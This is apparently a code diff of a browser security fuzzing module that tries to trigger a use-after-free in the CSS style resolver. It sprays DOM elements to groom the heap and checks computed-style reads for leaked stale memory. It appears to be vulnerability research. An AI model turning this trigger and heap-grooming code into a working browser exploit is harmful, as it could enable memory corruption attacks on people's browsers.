@@ -1,77 +1,72 @@
-import { GCOracle } from '../mod_executor.js';
 import { Groomer } from '../mod_groomer.js';
 
 export default {
     id:       'CSS_CUSTOM_PROPERTY_UAF',
-    category: 'Rendering',
+    category: 'DOM',
     risk:     'HIGH',
     description:
-        'Cascata CSS de 5 níveis com dependências cruzadas + @property Houdini. ' +
-        'offsetWidth forçado entre remoções cria multiple GC cycles do StyleResolver. ' +
-        'Testa remoção pai→filho e filho→pai para atingir ambos os caminhos C++.',
+        'UAF no CSS StyleResolver. Cria uma dependência de variáveis customizadas entre Pai e Filho. ' +
+        'O Pai é removido da árvore durante a resolução do computed style do Filho, forçando ' +
+        'a leitura de um objeto ComputedStyle libertado na memória nativa.',
 
     setup: function() {
-        this.style = document.createElement('style');
-        this.style.textContent = `
-            @property --fuzz-base { syntax: '<length>'; initial-value: 10px; inherits: true; }
-            @property --fuzz-mult { syntax: '<number>'; initial-value: 1; inherits: false; }
-            .fuzz-l0 { --fuzz-base: 20px; --fuzz-mult: 2; }
-            .fuzz-l1 { --fuzz-l1-w: calc(var(--fuzz-base) * var(--fuzz-mult)); }
-            .fuzz-l2 { --fuzz-l2-w: calc(var(--fuzz-l1-w, 0px) + 5px); }
-            .fuzz-l3 { --fuzz-l3-w: calc(var(--fuzz-l2-w, 0px) * 1.5); }
-            .fuzz-l4 { width: var(--fuzz-l3-w, 10px); }
-        `;
-        document.head.appendChild(this.style);
-
-        this.levels = [];
-        let parent = document.body;
-        for (let i = 0; i < 5; i++) {
-            const el = document.createElement('div');
-            el.className = `fuzz-l${i}`;
-            parent.appendChild(el);
-            this.levels.push(el);
-            parent = el;
-        }
-
-        this.levels.forEach(el => void el.getBoundingClientRect());
-        this.initialComputedWidths = this.levels.map(el => getComputedStyle(el).width);
-
-        // 🚨 Oráculo: Registramos o nível 0 (raiz da cascata)
-        if (GCOracle.registry) GCOracle.registry.register(this.levels[0], `${this.id}_target`);
+        this.results = {};
+        this.sandbox = document.getElementById('groomer-sandbox');
+        
+        // O Pai define a variável
+        this.parent = document.createElement('div');
+        this.parent.style.setProperty('--toxic-var', '1337px');
+        
+        // O Filho herda e usa a variável
+        this.child = document.createElement('div');
+        this.child.style.width = 'var(--toxic-var)';
+        
+        this.parent.appendChild(this.child);
+        this.sandbox.appendChild(this.parent);
+        
+        void this.parent.offsetWidth; // Constrói a árvore
     },
 
     trigger: function() {
-        this.levels[0].remove();
-        
-        // 🚨 Grooming: Esburaca o heap após a morte do nó pai
-        let nodes = Groomer.sprayDOM('div', 300);
-        Groomer.punchHoles(nodes, 2);
-
-        try { void this.levels[4].offsetWidth; } catch(e) {}
-
         try {
-            this.levels[1].style.setProperty('--fuzz-base', '999px');
-            void this.levels[4].offsetWidth;
-        } catch(e) {}
+            // O CSSOM C++ é chamado para resolver o filho
+            let cs = window.getComputedStyle(this.child);
+            
+            // O GATILHO: Destruímos o pai síncronamente.
+            // Em navegadores antigos, o ponteiro de resolução fica órfão.
+            this.parent.remove();
+            
+            // Fragmentamos a memória para corromper o ComputedStyle do pai
+            let trash = Groomer.sprayDOM('audio', 200);
 
-        this.levels[4].remove();
-        try { void this.levels[1].offsetWidth; } catch(e) {}
+            // A BOMBA: Lemos o valor. O C++ vai à memória do pai (agora corrompida) tentar ler '1337px'
+            this.results.leakedValue = cs.getPropertyValue('width');
+        } catch(e) {
+            this.results.error = e.message;
+        }
     },
 
     probe: [
-        s => getComputedStyle(s.levels[0]).width,
-        s => getComputedStyle(s.levels[1]).width,
-        s => getComputedStyle(s.levels[4]).width,
-        s => getComputedStyle(s.levels[1]).getPropertyValue('--fuzz-base').trim(),
-        s => { try { return s.levels[1].offsetWidth; } catch(e) { return e.constructor.name; } },
-        s => { try { return s.levels[2].getBoundingClientRect().width; } catch(e) { return e.constructor.name; } },
-        s => s.initialComputedWidths[4],
-        s => getComputedStyle(s.levels[3]).width === s.initialComputedWidths[3] ? 'unchanged' : 'CHANGED',
+        s => s.results.error || 'Resolução CSS Concluída',
+        
+        s => {
+            let val = s.results.leakedValue;
+            if (val) {
+                // Se leu '1337px', o WebKit protegeu bem. Se retornar vazio, mitigou.
+                // Se retornar lixo, temos Leak! Extraímos os números.
+                if (val !== '1337px' && val !== 'auto' && val !== '') {
+                    let num = parseFloat(val);
+                    if (!isNaN(num) && num > 2000) return num; // Retorna para acionar STALE DATA
+                }
+            }
+            return 0; // Seguro
+        }
     ],
 
     cleanup: function() {
-        try { this.levels.forEach(el => el.remove()); } catch(e) {}
-        try { this.style.remove(); } catch(e) {}
-        this.levels = null;
+        try { this.parent.remove(); this.child.remove(); } catch(e) {}
+        this.parent = null;
+        this.child = null;
+        this.results = {};
     }
 };
